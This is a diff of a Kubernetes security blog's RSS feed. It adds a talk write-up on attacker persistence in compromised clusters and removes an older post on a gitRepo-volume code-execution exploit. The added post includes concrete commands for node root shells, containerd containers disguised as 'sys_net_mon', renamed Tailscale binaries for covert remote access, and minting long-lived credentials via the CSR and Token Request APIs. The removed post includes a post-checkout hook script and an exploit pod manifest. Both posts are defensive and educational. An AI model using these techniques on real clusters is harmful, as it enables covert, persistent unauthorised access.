@@ -7,6 +7,157 @@
 		<atom:link href="https://raesene.github.io/feed.xml" rel="self" type="application/rss+xml" />
 		
 			<item>
+				<title>Beyond the surface - Exploring attacker persistence strategies in Kubernetes</title>
+				<description>&lt;p&gt;I’ve been doing a talk on Kubernetes post-exploitation for a while now and one of requests has been for a blog post to refer back to, which I’m finally getting around to doing now!&lt;/p&gt;
+
+&lt;p&gt;The goal of this talk is to lay out one attack path that attackers might use to retain and expand their access after an initial compromise of a Kubernetes cluster by getting access to an admin’s credentials. It doesn’t cover all the ways that attackers could do this, but provides one path and also hopefully illuminates some of the inner workings and default settings that attackers might exploit as part of their exploits.&lt;/p&gt;
+
+&lt;p&gt;There’s a recording of a slightly earlier version of the talk &lt;a href=&quot;https://youtu.be/4L8Dg_QSx30?si=Y4eit5EMmCBFOBQN&quot;&gt;here&lt;/a&gt; if you prefer videos, the flow is similar but I have simplified a bit for the latest iteration, thanks to &lt;a href=&quot;https://raesene.github.io/blog/2025/05/30/kubernetes-debug-profiles/&quot;&gt;debug profiles&lt;/a&gt;! The general story the talk tells is one where attackers have temporary access to a cluster admin’s laptop where the admin has stepped away to take a call and not locked it, and they have to see how to get and keep access to the cluster before the admin comes back.&lt;/p&gt;
+
+&lt;h3 id=&quot;initial-access&quot;&gt;Initial access&lt;/h3&gt;
+
+&lt;p&gt;One of the first things an attacker might want to do with credentials is get a root shell on a Kubernetes cluster node as a good spot to look for credentials or plant binaries. With Kubernetes that’s very simple to do as there is functionality built in to the cluster to allow for users with the right levels of access to do that quickly via &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kubectl debug&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;A typical command might look like this (just replace the node name with one from your cluster)&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kubectl debug node/gke-demo-cluster-default-pool-04a13cdb-5p8d -it --profile=sysadmin --image=busybox
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;An important point from this command is the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--profile&lt;/code&gt; switch as it dictates how much access you’ll have to the node. The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sysadmin&lt;/code&gt; profile provides the highest level of access, so is the most useful for attackers.&lt;/p&gt;
+
+&lt;h3 id=&quot;executing-binaries&quot;&gt;Executing Binaries&lt;/h3&gt;
+
+&lt;p&gt;Once the attacker has shell access to a node, their next instinct is likely to download tools to run. This might not be as simple as it could be as many Kubernetes distributions lock down the Node OS, setting filesystems as read-only or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;noexec&lt;/code&gt;. However, all cluster nodes can do one thing… run containers. So if the attacker can download and run a container on the node, they’re likely to be able to run any programs they like!&lt;/p&gt;
+
+&lt;p&gt;Doing this we can take a look at some lesser known features of Kubernetes clusters. In a cluster, all containers are run by a container runtime, typically &lt;a href=&quot;https://containerd.io/&quot;&gt;containerd&lt;/a&gt; or &lt;a href=&quot;https://cri-o.io/&quot;&gt;CRI-O&lt;/a&gt;, and it’s possible to talk directly to those programs if you’re on the node, bypassing the Kubernetes APIs altogether.&lt;/p&gt;
+
+&lt;p&gt;In the talk I start by creating a new containerd namespace using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ctr&lt;/code&gt; tool. Ctr is very useful as it’s always installed (IME) alongside containerd, so you don’t need to get an external client program. We’re creating a containerd namespace to make it a bit harder for someone looking at the host to spot our container. Importantly containerd namespaces have nothing to do with Kubernetes namespaces, or Linux namespaces.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ctr namespace create sys_net_mon
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We create a namespace called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sys_net_mon&lt;/code&gt; just to make it a bit less obvious than “attackers were here”!. With the namespace created, the next step is to pull down a container image. The one I’m using is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker.io/sysnetmon/systemd_net_mon:latest&lt;/code&gt; . Importantly the contents of this container image have nothing to do with systemd or network monitoring! From a security standpoint it’s an important thing to remember that outside of the official or verified images, Docker Hub does no curation of image contents, so anyone can call their images anything!&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ctr -n sys_net_mon images pull docker.io/sysnetmon/systemd_net_mon:latest
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;With the image pulled we can use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ctr&lt;/code&gt; to start a container&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ctr -n sys_net_mon run --net-host -d --mount type=bind,src=/,dst=/host,options=rbind:ro docker.io/sysnetmon/systemd_net_mon:latest sys_net_mon
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;This container provides us with full access to the hosts filesystem and also the host’s network interfaces which is pretty useful for post-exploitation activity. After that it’s just a question of getting a shell in the container.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ctr -n sys_net_mon run --net-host -d --mount type=bind,src=/,dst=/host,options=rbind:ro docker.io/sysnetmon/systemd_net_mon:latest sys_net_mon
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;static-manifests&quot;&gt;Static Manifests&lt;/h3&gt;
+
+&lt;p&gt;Another approach which the attackers could use to run a container on the node is static manifests. Most Kubelets will define a directory on the host which it will load static manifests from. These manifests run a pod without any API server necessary. A handy trick for our attackers is to give their static pod an invalid namespace name, as this prevents it being registered with the API server, so it won’t show up in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kubectl get pods -A&lt;/code&gt; or similar. There’s more details on static pods and some of their security oddness on &lt;a href=&quot;https://blog.iainsmart.co.uk/posts/2024-10-13-mirror-mirror/&quot;&gt;Iain Smart’s blog&lt;/a&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;remote-access&quot;&gt;Remote Access&lt;/h3&gt;
+
+&lt;p&gt;The next problem our attackers have to tackle is retaining remote access to the environment after the admin returns to their laptop. Whilst there are a number of remote access programs available, a lot of the security/hacker related ones will be spotted by EDR/XDR style agents, so an alternative can be using something like &lt;a href=&quot;https://tailscale.com/&quot;&gt;Tailscale&lt;/a&gt;!&lt;/p&gt;
+
+&lt;p&gt;Tailscale has a number of features which are very useful for attackers (in addition to their normal usefulness!). First one is that it can be run with two statically compiled golang binaries that can be renamed. This means that you pick what will show up in the process list of the node. Following the theme of the container image, we use binaries &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;systemd_net_mon_server&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;systemd_net_mon_client&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;The first command starts the server&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;systemd_net_mon_server --tun=userspace-networking --socks5-server=localhost:1055 &amp;amp;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;and then we start the client&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;systemd_net_mon_client up --ssh --hostname cafebot --auth-key=tskey-auth-XXXXX
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;In terms of network access this will run on only 443/TCP outbound if it uses Tailscale’s DERP network, so that access will probably be allowed in most environments. Also we can use Tailscale’s ACL feature so that our compromised container can’t communicate with any other machines on our Tailnet.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raesene.github.io/assets/media/Tailscale-bot-access-control.png&quot; alt=&quot;Tailscale ACLs&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;With those services running it should be possible to come back into the container over SSH. Tailscale bundles an SSH server with the program, no SSHD will show as running :)&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;tailscale ssh root@cafebot
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;credentials---kubelet-api&quot;&gt;Credentials - Kubelet API&lt;/h3&gt;
+
+&lt;p&gt;With remote access achieved, our attackers still need long lasting credentials and also it would be nice if they could probe the cluster without touching the Kubernetes API server, as that might show up in audit logs. So to do this they need access to credentials for a user who can talk to the Kubelet API directly. This runs on every node on 10250/TCP and has no auditing option available.&lt;/p&gt;
+
+&lt;p&gt;In the talk to do this I use &lt;a href=&quot;https://github.com/raesene/teisteanas/&quot;&gt;teisteanas&lt;/a&gt; which creates Kubeconfig based credentials for users using the Certificiate Signing Request (CSR) API. We can create a set of credentials for any user using this approach. For stealth an attacker would likely choose a user which already has rights assigned to it in RBAC, so they don’t have to create any new cluster roles or cluster role bindings. The exact user to use will vary, but in the demos from the talk I use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kube-apiserver&lt;/code&gt; which is a user that exists in GKE clusters.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;teisteanas -username kube-apiserver -output-file kubelet-user.config
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;With that Kubeconfig file in hand and access to the Kubelet port on a host, it’s possible to take actions like listing pods on a node or executing commands in those pods. The easiest way to do this is to use &lt;a href=&quot;https://github.com/cyberark/kubeletctl&quot;&gt;kubeletctl&lt;/a&gt;. So from our container which is running on the node, using the node’s network namespace, we can run something like this&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kubeletctl -s 127.0.0.1 -k kubelet-user.config pods
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;csr-api&quot;&gt;CSR API&lt;/h3&gt;
+
+&lt;p&gt;It’s also important to understand a bit about the CSR API as, for attackers, it’s a useful thing to take advantage of. This API exists in pretty much every Kubernetes distribution and can be used to create credentials that authenticate to the cluster, apart from when using EKS as it does not allow that function. Very importantly credentials created via the CSR API can be abused by anyone who has access to the API server. Most managed Kubernetes distributions have chosen to have the Kubernetes API server exposed to the Internet by default, so an attacker who is able to get credentials for a cluster will be able to use them from anywhere in the world!&lt;/p&gt;
+
+&lt;p&gt;The CSR API is also attractive to attackers for a number of reasons :-&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Unless audit logging is enabled and correctly configured there is no record of the API having been used and the credentials having been created.&lt;/li&gt;
+  &lt;li&gt;Credentials created by this API cannot be revoked without rotating the certificate authority for the whole cluster, which is a disruptive operation. The &lt;a href=&quot;https://github.com/kubernetes/kubernetes/issues/18982&quot;&gt;GitHub issue related to certificate revocation&lt;/a&gt; has been open since 2015, so it’s likely this will not change now…&lt;/li&gt;
+  &lt;li&gt;It’s possible to create credentials for generic system accounts, so even if the cluster operator has audit logging enabled, it could be difficult to identify malicious activity.&lt;/li&gt;
+  &lt;li&gt;The credentials tend to be long lived. Whilst this is distribution dependent, generally this is 1-5 years.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;In the demos for the talk we’re running against a GKE cluster, so used the CSR API to generate credentials for the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system:gke-common-webhooks&lt;/code&gt; user which has quite wide ranging privileges.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;teisteanas -username system:gke-common-webhooks -output-file webhook.config
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;token-request-api&quot;&gt;Token Request API&lt;/h3&gt;
+
+&lt;p&gt;Even if the CSR API isn’t available there’s another option built into Kubernetes that can create new credentials, which is the Token Request API. This is used by Kubernetes clusters to create service account tokens, but there’s nothing to stop an administrator who has the correct rights from using it. Similarly to the CSR API there’s no persistent record (apart from audit logs) that new credentials have been created, and they can be hard to revoke if a system level service account has been used, as the only way to revoke the credential is to delete it’s associated service account.&lt;/p&gt;
+
+&lt;p&gt;The expiry may be less of a problem, depending on the Kubernetes distribution in use, it can vary from 24 hours maximum  to one year, from the managed distributions I’ve looked at.&lt;/p&gt;
+
+&lt;p&gt;In the talk I use &lt;a href=&quot;https://github.com/raesene/tocan/&quot;&gt;tocan&lt;/a&gt; to simplify the process of creating a Kubeconfig file from a service account token.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;tocan -namespace kube-system -service-account clusterrole-aggregation-controller
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The service account we clone is an interesting one as it has the “escalate” right, which means it can always become Cluster-admin even if it doesn’t have those rights to begin with. (I’ve written about &lt;a href=&quot;https://raesene.github.io/blog/2020/12/12/Escalating_Away/&quot;&gt;escalate&lt;/a&gt; before)&lt;/p&gt;
+
+&lt;h3 id=&quot;detecting-these-attacks&quot;&gt;Detecting these attacks&lt;/h3&gt;
+
+&lt;p&gt;The talk closes by discussing how to detect and prevent these kind of attacks. For detection there’s a couple of key things to look at&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;Kubernetes audit logs&lt;/strong&gt; - This one is very important. You need to have audit logging enabled with centralized logs and good retention, to spot some of the techniques used here, especially abuse of the CSR and Token Request APIs&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Node Agents&lt;/strong&gt; - Having security agents running on cluster nodes could allow for detection of things like the Tailscale traffic, depending on their configuration&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Node Logs&lt;/strong&gt; - Generally ensuring that logs on nodes are properly centralized and stored is going to be important, as attackers can leave traces there.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Know what good looks like&lt;/strong&gt; - This one sounds simple but possibly isn’t. If you know what processes should be running on your cluster nodes, you can spot things like “systemd_net_mon” when they show up. What’s tricky here is that every distribution has a different set of management services run by the cloud provider, so it’s not a one off effort knowing what should be there.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;preventing-these-attacks&quot;&gt;Preventing these attacks&lt;/h3&gt;
+
+&lt;p&gt;There are a couple of key ways cluster admins can reduce the risk of this scenario happening to them,&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;Take your clusters off the Internet!!&lt;/strong&gt; - Exposing the API server this way means you are one set of lost credentials away from a very bad day. Generally managed Kubernetes distributions will allow you to restrict access, but it’s not the default.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Least Privilege&lt;/strong&gt; - In this scenario, the compromised laptop had cluster-admin level privileges, enabling the attackers to move through the cluster easily. If the admin had been using an account with fewer privileges, the attacks might well not have succeeded. Whilst some of the rights used, like node debugging, are probably quite commonly used, others like the CSR API and Token Request API probably shouldn’t be needed in day-to-day administration, so could be restricted.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;To quote &lt;a href=&quot;https://bsky.app/profile/lookitup.baby&quot;&gt;Ian Coldwater&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raesene.github.io/assets/media/made-of-stars.png&quot; alt=&quot;Made of stars&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h3&gt;
+
+&lt;p&gt;This talk just looks at one path that attackers could take to retain and expand their access to a cluster which they get access to. There are obviously other possibilities, but this can shed some light on some of the ways that Kubernetes works and how to improve your cluster security!&lt;/p&gt;
+</description>
+				<pubDate>Fri, 12 Sep 2025 10:00:00 +0100</pubDate>
+				<link>https://raesene.github.io/blog/2025/09/12/beyond-the-surface/</link>
+				<guid isPermaLink="true">https://raesene.github.io/blog/2025/09/12/beyond-the-surface/</guid>
+			</item>
+		
+			<item>
 				<title>Bitnami Deprecation</title>
 				<description>&lt;p&gt;&lt;strong&gt;Update&lt;/strong&gt; Looks like Bitnami decided to take some more time over this &lt;a href=&quot;https://community.broadcom.com/tanzu/blogs/beltran-rueda-borrego/2025/08/18/how-to-prepare-for-the-bitnami-changes-coming-soon&quot;&gt;details here&lt;/a&gt; and have some 1-day brown outs before removing the repos on Sept 29.&lt;/p&gt;
 
@@ -691,79 +842,6 @@ num   pkts bytes target     prot opt in     out     source               destina
 				<pubDate>Fri, 01 Nov 2024 08:00:00 +0000</pubDate>
 				<link>https://raesene.github.io/blog/2024/11/01/The-Many-IP-Addresses-Of-Kubernetes/</link>
 				<guid isPermaLink="true">https://raesene.github.io/blog/2024/11/01/The-Many-IP-Addresses-Of-Kubernetes/</guid>
-			</item>
-		
-			<item>
-				<title>Fun With GitRepo Volumes</title>
-				<description>&lt;p&gt;On Monday this week I noticed a new and really interesting blog from &lt;a href=&quot;https://x.com/ImreRad&quot;&gt;Imre Rad&lt;/a&gt;. The &lt;a href=&quot;https://irsl.medium.com/sneaky-write-hook-git-clone-to-root-on-k8s-node-e38236205d54&quot;&gt;Blog Post&lt;/a&gt; described an unpatched issue in Kubernetes, which allows any user with the ability to create &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gitRepo&lt;/code&gt; volumes to execute code on the underlying host as the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt; user! For the details of how this works, please read Imre’s blog as all the cool research is his, I’m just looking at how it might be exploited :)&lt;/p&gt;
-
-&lt;h2 id=&quot;pre-requisites&quot;&gt;Pre-requisites&lt;/h2&gt;
-
-&lt;p&gt;So the first thing to check is, what do I need to be in place for this issue to be exploited. First up we need the &lt;a href=&quot;https://kubernetes.io/docs/concepts/storage/volumes/#gitrepo&quot;&gt;gitRepo&lt;/a&gt; volume type to be available. This has been deprecated since Kubernetes 1.11, which is a long time ago, but critically it’s not been removed from Kubernetes. In my experiments so far I’ve not found a single distribution that didn’t support it, so that’s good.&lt;/p&gt;
-
-&lt;p&gt;Next up, we need the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git&lt;/code&gt; binary to be present on the node, as this volume type directly uses the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git&lt;/code&gt; binary. From what I’ve seen so far this is a pretty common configuration, with GKE standard, AKS, and RKE all having it present. A default EKS install didn’t but of course I’d guess it could be added if a cluster admin found they needed it. It also wasn’t present in KinD cluster by default, so for my demo I had to add it :D&lt;/p&gt;
-
-&lt;p&gt;The last part of the puzzle is user rights. The user who exploits this needs to have &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;create&lt;/code&gt; rights on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pods&lt;/code&gt; and also not be blocked from using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gitRepo&lt;/code&gt; volume type. That volume type is not blocked in &lt;a href=&quot;https://kubernetes.io/docs/concepts/security/pod-security-standards/&quot;&gt;baseline PSS&lt;/a&gt; (at the moment), but isn’t allowed in the restricted profile, so it’s possible this wouldn’t work, but I’d guess quite a few clusters don’t block it.&lt;/p&gt;
-
-&lt;h2 id=&quot;exploiting-the-vulnerability&quot;&gt;Exploiting the vulnerability&lt;/h2&gt;
-
-&lt;p&gt;So now we know what we need, what can we do with this? Well I was wondering if I could do something based on my earlier research on &lt;a href=&quot;https://raesene.github.io/blog/2024/03/24/Using-Tailscale-for-persistence/&quot;&gt;Using Tailscale for persistence&lt;/a&gt;, and create a pod that automatically joins a Tailnet as a bot.&lt;/p&gt;
-
-&lt;p&gt;To do this we’ll need a Docker image that, when run, starts Tailscale and joins the network. That could be kind of risky as we’ll need to embed an Auth key, but fortunately Tailscale provides &lt;a href=&quot;https://tailscale.com/kb/1085/auth-keys#types-of-auth-keys&quot;&gt;one-off&lt;/a&gt; auth keys that will only function a single time. Also we can use Tailscale ACLs to ensure that when a victim joins, they can’t actually reach anything else on the tailnet.&lt;/p&gt;
-
-&lt;p&gt;Next we’ll need to modify Imre’s &lt;a href=&quot;https://github.com/irsl/g&quot;&gt;PoC&lt;/a&gt;. This turns out to be a lot more simple than I thought. Basically you just put any commands you want in the &lt;a href=&quot;https://github.com/raesene/repopodexploit/blob/main/hooks/post-checkout&quot;&gt;post-checkout&lt;/a&gt; script.&lt;/p&gt;
-
-&lt;p&gt;In my example I create a Containerd namespace, then pull my Tailscale joining image, and then run it with host networking, and mounting the host’s root filesystem into the container, which looks a bit like this&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#!/bin/sh
-ctr namespace create sys_net_mon
-ctr -n sys_net_mon images pull docker.io/raesene/gitrepodemo:latest
-ctr -n sys_net_mon run --net-host -d --mount type=bind,src=/,dst=/host,options=rbind:ro docker.io/raesene/gitrepodemo:latest sys_net_mon
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Then we just need a manifest that has a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gitRepo&lt;/code&gt; volume which references the repository with our script. For that we just modify Imre’s PoC with our forked repository.&lt;/p&gt;
-
-&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;na&quot;&gt;apiVersion&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;v1&lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;kind&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Pod&lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;metadata&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
-  &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;test-pd&lt;/span&gt;
-&lt;span class=&quot;na&quot;&gt;spec&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
-  &lt;span class=&quot;na&quot;&gt;containers&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
-  &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;image&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;alpine:latest&lt;/span&gt;
-    &lt;span class=&quot;na&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;pi&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;sleep&quot;&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;86400&quot;&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;]&lt;/span&gt;
-    &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;test-container&lt;/span&gt;
-    &lt;span class=&quot;na&quot;&gt;volumeMounts&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
-    &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;mountPath&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;/gitrepo&lt;/span&gt;
-      &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;gitvolume&lt;/span&gt;
-  &lt;span class=&quot;na&quot;&gt;volumes&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
-  &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;gitvolume&lt;/span&gt;
-    &lt;span class=&quot;na&quot;&gt;gitRepo&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
-      &lt;span class=&quot;na&quot;&gt;directory&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;g/.git&lt;/span&gt;
-      &lt;span class=&quot;na&quot;&gt;repository&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;https://github.com/raesene/repopodexploit.git&lt;/span&gt;
-      &lt;span class=&quot;na&quot;&gt;revision&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;main&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;pulling-it-all-together&quot;&gt;Pulling it all together&lt;/h2&gt;
-
-&lt;p&gt;So what does this all look like when you run it. Well like most console exploits, not that fancy, but it does demonstrate how someone can go from having &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;create&lt;/code&gt; pod rights to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt; on a node, in a single command.&lt;/p&gt;
-
-&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/9IyowCL8Gd0?si=VkE0n8pDHNegZ1_s&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share&quot; referrerpolicy=&quot;strict-origin-when-cross-origin&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;
-
-&lt;h2 id=&quot;preventing-this&quot;&gt;Preventing this!&lt;/h2&gt;
-
-&lt;p&gt;So how do you stop this happening to your cluster. There is a &lt;a href=&quot;https://github.com/kubernetes/kubernetes/pull/124531&quot;&gt;PR&lt;/a&gt; that Imre wrote to fix this. At the moment that’s looking like it will be added to all supported versions of Kubernetes (back to 1.28).&lt;/p&gt;
-
-&lt;p&gt;Until that patched version is in place, you can use admission control to block the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gitRepo&lt;/code&gt; Volume types. If you have access to ValidatingAdmissionPolicy, then there’s a CEL expression in the &lt;a href=&quot;https://kubernetes.io/docs/concepts/storage/volumes/#gitrepo&quot;&gt;volume description&lt;/a&gt;. Alternatively it should be possible to block this with other common admission control solutions.&lt;/p&gt;
-
-&lt;p&gt;A hack fix would be to remove the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git&lt;/code&gt; binary from your nodes, but that’s not really a great solution…&lt;/p&gt;
-
-&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;
-
-&lt;p&gt;This is an interesting issue, as it’s not been assigned a CVE but, as you can see, could lead to breakout from a container to the underlying node. The goal of this blog has been to demonstrate one possible impact from that and to raise some awareness of why you probably want to fix it, if your threat model includes having users who you want to create pods, but not necessarily give root access to your cluster nodes to!&lt;/p&gt;
-</description>
-				<pubDate>Wed, 10 Jul 2024 18:27:00 +0100</pubDate>
-				<link>https://raesene.github.io/blog/2024/07/10/Fun-With-GitRepo-Volumes/</link>
-				<guid isPermaLink="true">https://raesene.github.io/blog/2024/07/10/Fun-With-GitRepo-Volumes/</guid>
 			</item>
 		
 	</channel>
